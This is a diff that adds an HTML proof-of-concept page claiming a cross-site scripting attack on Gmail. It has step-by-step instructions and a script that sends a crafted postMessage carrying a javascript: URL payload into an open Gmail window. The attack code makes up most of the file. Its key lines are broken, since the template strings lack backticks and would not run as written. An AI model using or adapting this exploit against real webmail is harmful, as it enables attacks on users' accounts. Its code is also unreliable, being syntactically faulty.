@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Gmail XSS PoC</title>
+  <style>
+    body {
+      font-family: sans-serif;
+      max-width: 600px;
+      margin: 40px auto;
+    }
+    input, button {
+      padding: 10px;
+      font-size: 16px;
+      width: 100%;
+      margin: 10px 0;
+    }
+  </style>
+</head>
+<body>
+
+  <h2>🚨 Gmail XSS Proof of Concept</h2>
+
+  <ol>
+    <li>Click the button below to open Gmail in a new window.</li>
+    <li>In the Gmail window, press <strong>F12</strong> to open the Developer Console.</li>
+    <li>Paste the following code into the console and hit Enter:
+      <pre>
+addEventListener("message", function(e) {
+  console.log(e.data);
+});
+      </pre>
+    </li>
+    <li>Look for a message that starts with a 5–6 character value like: <code>abc123|...</code></li>
+    <li>Copy that 5–6 character prefix (before the "|") and paste it below.</li>
+    <li>Click "Send XSS Message" to trigger the exploit.</li>
+  </ol>
+
+  <button onclick="openGmail()">📬 Open Gmail</button>
+
+  <input type="text" id="channel" placeholder="Enter CHANNEL_NAME (e.g., abc123)" />
+  <button onclick="sendXSS()">💥 Send XSS Message</button>
+
+  <script>
+    let gmailWindow;
+
+    function openGmail() {
+      gmailWindow = window.open("https://mail.google.com/mail/u/0/#inbox", "gmailWindow");
+    }
+
+    function sendXSS() {
+      const channel = document.getElementById("channel").value.trim();
+      if (!channel || !gmailWindow) {
+        alert("Please enter a valid channel and make sure Gmail is open.");
+        return;
+      }
+
+      const payload = javascript:alert('XSS by ${channel}');
+      const message = ${channel}|cp:[[["h_chm","preld","${payload}"]],null];
+
+      gmailWindow.postMessage(message, "*");
+      alert("XSS message sent! Check the Gmail window.");
+    }
+  </script>
+
+</body>
+</html>
